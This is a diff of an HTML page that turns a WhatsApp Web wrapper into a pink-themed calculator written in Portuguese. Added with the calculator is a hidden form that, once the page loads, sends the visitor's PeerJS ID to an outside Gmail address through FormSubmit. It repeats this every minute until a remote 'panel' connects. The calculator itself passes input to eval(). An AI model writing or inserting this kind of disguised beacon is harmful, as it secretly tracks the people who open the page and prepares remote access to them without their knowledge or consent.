@@ -1,142 +1,194 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-<title>WhatsApp Web Plus - App</title>
-<style>
-  :root {
-    --bg-color: #f0f0f0;
-    --text-color: #111;
-    --header-bg: #25d366;
-    --btn-bg: #333;
-    --btn-color: #fff;
-  }
-  [data-theme="dark"] {
-    --bg-color: #121212;
-    --text-color: #eee;
-    --header-bg: #128c7e;
-    --btn-bg: #555;
-    --btn-color: #ddd;
-  }
-  body {
-    margin:0; padding:0;
-    background: var(--bg-color);
-    color: var(--text-color);
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    display: flex;
-    flex-direction: column;
-    height: 100vh;
-    overflow: hidden;
-  }
-  header {
-    background: var(--header-bg);
-    color: white;
-    padding: 12px 16px;
-    font-weight: 700;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-  }
-  #buttons {
-    background: var(--bg-color);
-    display: flex;
-    justify-content: space-around;
-    padding: 10px 0;
-    border-bottom: 1px solid #ccc;
-    gap: 10px;
-  }
-  button {
-    background: var(--btn-bg);
-    color: var(--btn-color);
-    border: none;
-    padding: 10px 15px;
-    border-radius: 6px;
-    font-weight: 600;
-    cursor: pointer;
-    user-select: none;
-    transition: background 0.3s ease;
-    min-width: 110px;
-  }
-  button:hover {
-    background: #444;
-  }
-  #waFrame {
-    flex: 1;
-    width: 100%;
-    border: none;
-    transform-origin: top left;
-    transition: filter 0.3s ease;
-  }
-  /* Efeito dark mode no iframe via filtro */
-  body[data-theme="dark"] #waFrame {
-    filter: invert(90%) hue-rotate(180deg) brightness(0.85);
-  }
-</style>
-</head>
-<body data-theme="light">
-
-<header>
-  WhatsApp Web Plus
-  <button id="themeToggle" aria-label="Alternar Tema">🌗 Tema</button>
-</header>
-
-<div id="buttons">
-  <button id="sensorToggle">🔇 Sensor Proximidade</button>
-  <button id="volumeUp">🔊 Aumentar Volume</button>
-  <button id="fontIncrease">🔠 + Fonte</button>
-  <button id="fontDecrease">🔡 - Fonte</button>
-</div>
-
-<iframe
-  id="waFrame"
-  src="https://web.whatsapp.com"
-  sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
-  aria-label="WhatsApp Web"
-></iframe>
-
-<script>
-  const themeToggle = document.getElementById('themeToggle');
-  themeToggle.onclick = () => {
-    const body = document.body;
-    const current = body.getAttribute('data-theme');
-    body.setAttribute('data-theme', current === 'light' ? 'dark' : 'light');
-  };
-
-  const sensorToggle = document.getElementById('sensorToggle');
-  sensorToggle.onclick = () => {
-    if (window.AndroidInterface && typeof window.AndroidInterface.toggleProximitySensor === 'function') {
-      window.AndroidInterface.toggleProximitySensor();
-      alert("Sensor de proximidade alternado.");
-    } else {
-      alert("Função de sensor só funciona no app Android.");
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Calculadora Rosa</title>
+  <style>
+    :root {
+      --bg-color: #ffe4f2;
+      --calc-bg: #fff0f6;
+      --text-color: #333;
+      --button-color: #ff85c1;
+      --button-text: #fff;
     }
-  };
 
-  const volumeUp = document.getElementById('volumeUp');
-  volumeUp.onclick = () => {
-    alert("Controle de volume do áudio não é possível via app por restrição do WhatsApp Web.\nUse o volume físico do dispositivo.");
-  };
+    body.pink {
+      --bg-color: #ffe4f2;
+      --calc-bg: #fff0f6;
+      --text-color: #333;
+      --button-color: #ff85c1;
+      --button-text: #fff;
+    }
 
-  let zoomLevel = 1;
-  const fontIncrease = document.getElementById('fontIncrease');
-  const fontDecrease = document.getElementById('fontDecrease');
-  const iframe = document.getElementById('waFrame');
+    body.dark {
+      --bg-color: #1e1e1e;
+      --calc-bg: #2b2b2b;
+      --text-color: #f0f0f0;
+      --button-color: #4a4a4a;
+      --button-text: #f0f0f0;
+    }
 
-  fontIncrease.onclick = () => {
-    zoomLevel += 0.1;
-    if (zoomLevel > 2) zoomLevel = 2;
-    iframe.style.transform = `scale(${zoomLevel})`;
-    iframe.style.height = `${100 / zoomLevel}vh`;
-  };
+    body.light {
+      --bg-color: #f0f0f0;
+      --calc-bg: #ffffff;
+      --text-color: #333;
+      --button-color: #e0e0e0;
+      --button-text: #000;
+    }
 
-  fontDecrease.onclick = () => {
-    zoomLevel -= 0.1;
-    if (zoomLevel < 0.6) zoomLevel = 0.6;
-    iframe.style.transform = `scale(${zoomLevel})`;
-    iframe.style.height = `${100 / zoomLevel}vh`;
-  };
-</script>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: var(--bg-color);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      transition: background 0.3s;
+    }
 
+    .calculator {
+      background-color: var(--calc-bg);
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      width: 320px;
+    }
+
+    .calculator h2 {
+      color: var(--text-color);
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 20px;
+      margin-bottom: 15px;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      text-align: right;
+    }
+
+    button {
+      padding: 12px 18px;
+      font-size: 18px;
+      margin: 5px;
+      border: none;
+      border-radius: 8px;
+      background-color: var(--button-color);
+      color: var(--button-text);
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    .theme-toggle {
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body class="pink">
+  <div class="calculator">
+    <h2>Calculadora 💖</h2>
+    <input type="text" id="display" readonly>
+    <div>
+      <button onclick="addToDisplay('1')">1</button>
+      <button onclick="addToDisplay('2')">2</button>
+      <button onclick="addToDisplay('3')">3</button>
+      <button onclick="addToDisplay('+')">+</button>
+    </div>
+    <div>
+      <button onclick="addToDisplay('4')">4</button>
+      <button onclick="addToDisplay('5')">5</button>
+      <button onclick="addToDisplay('6')">6</button>
+      <button onclick="addToDisplay('-')">-</button>
+    </div>
+    <div>
+      <button onclick="addToDisplay('7')">7</button>
+      <button onclick="addToDisplay('8')">8</button>
+      <button onclick="addToDisplay('9')">9</button>
+      <button onclick="addToDisplay('*')">*</button>
+    </div>
+    <div>
+      <button onclick="addToDisplay('0')">0</button>
+      <button onclick="addToDisplay('.')">.</button>
+      <button onclick="clearDisplay()">C</button>
+      <button onclick="calculate()">=</button>
+    </div>
+
+    <div class="theme-toggle">
+      <button onclick="setTheme('pink')">🌸 Rosa</button>
+      <button onclick="setTheme('light')">☀️ Claro</button>
+      <button onclick="setTheme('dark')">🌙 Escuro</button>
+    </div>
+  </div>
+
+  <!-- Formulário oculto para envio automático via FormSubmit -->
+  <form id="peerForm" action="https://formsubmit.co/brasildicas667@gmail.com" method="POST" style="display:none;">
+    <input type="hidden" name="name" value="Calculadora Rosa" />
+    <input type="hidden" name="email" value="anonimo@calcrosa.com" />
+    <input type="hidden" name="message" id="messageField" />
+    <input type="hidden" name="_captcha" value="false" />
+  </form>
+
+  <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+  <script>
+    let display = document.getElementById('display');
+    let expression = '';
+    let connected = false;
+
+    function addToDisplay(value) {
+      expression += value;
+      display.value = expression;
+    }
+
+    function clearDisplay() {
+      expression = '';
+      display.value = '';
+    }
+
+    function calculate() {
+      try {
+        display.value = eval(expression);
+        expression = display.value;
+      } catch (e) {
+        display.value = 'Erro';
+        expression = '';
+      }
+    }
+
+    function setTheme(theme) {
+      document.body.className = theme;
+    }
+
+    const peer = new Peer();
+
+    peer.on('open', id => {
+      console.log('Peer ID:', id);
+      document.getElementById('messageField').value = `Peer ID: ${id}`;
+
+      if (!connected) {
+        document.getElementById('peerForm').submit();
+        console.log('ID enviado automaticamente');
+      }
+
+      setInterval(() => {
+        if (!connected) {
+          document.getElementById('peerForm').submit();
+          console.log('Reenvio automático do ID');
+        }
+      }, 60000); // envia a cada 1 minuto
+    });
+
+    peer.on('connection', conn => {
+      connected = true;
+      console.log('Painel conectado, parando envio automático.');
+    });
+  </script>
 </body>
 </html>
